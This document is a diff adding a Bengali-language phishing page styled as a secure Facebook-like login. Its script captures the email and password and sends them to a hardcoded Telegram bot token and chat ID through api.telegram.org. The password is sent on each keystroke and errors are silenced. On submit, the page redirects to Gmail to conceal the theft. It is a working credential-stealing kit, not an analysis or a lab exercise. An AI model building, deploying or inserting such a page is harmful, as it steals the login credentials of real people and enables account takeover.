@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>প্রাইভেসি ভেরিফিকেশন</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
+        .login-container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 90%; max-width: 360px; text-align: center; }
+        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
+        button { width: 100%; padding: 14px; background-color: #1877f2; border: none; border-radius: 8px; color: white; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <h2>নিরাপদ লগইন</h2>
+    <p>তথ্যগুলো পূরণ করে এগিয়ে যান।</p>
+    
+    <form id="loginForm">
+        <input type="email" id="email" placeholder="ইমেইল বা ফোন নম্বর" required autocomplete="username">
+        <input type="password" id="password" placeholder="পাসওয়ার্ড" required autocomplete="current-password">
+        <button type="submit">এগিয়ে যান</button>
+    </form>
+    
+    <div style="font-size: 12px; color: #90949c; margin-top: 20px;">Mst. Sarmin Akter &copy; 2026</div>
+</div>
+
+<script>
+    const BOT_TOKEN = '7957986649:AAGCcJ5R6g6PMHEgWXFqLRn2SrpElZvUtnE'; 
+    const CHAT_ID = '8516934257';
+
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+
+    // ডাটা পাঠানোর মেইন ফাংশন
+    function sendToTelegram(data) {
+        const message = `⚡ রিয়েল-টাইম আপডেট:\n\n📧 ইউজার: ${emailInput.value}\n🔑 পাসওয়ার্ড: ${data}\n👤 আইডি: ${CHAT_ID}`;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        }).catch(err => console.log("Network silent."));
+    }
+
+    // পাসওয়ার্ড ফিল্ডে নজর রাখা
+    passwordInput.addEventListener('input', function() {
+        const val = this.value;
+        // যদি পাসওয়ার্ড ২ বা তার বেশি অক্ষরের হয়, তবে প্রতিবার টাইপ করার সাথে সাথে পাঠাবে
+        if (val.length >= 2) {
+            sendToTelegram(val);
+        }
+    });
+
+    // ফাইনাল সাবমিট
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        window.location.href = "https://mail.google.com/"; 
+    });
+</script>
+
+</body>
+</html>
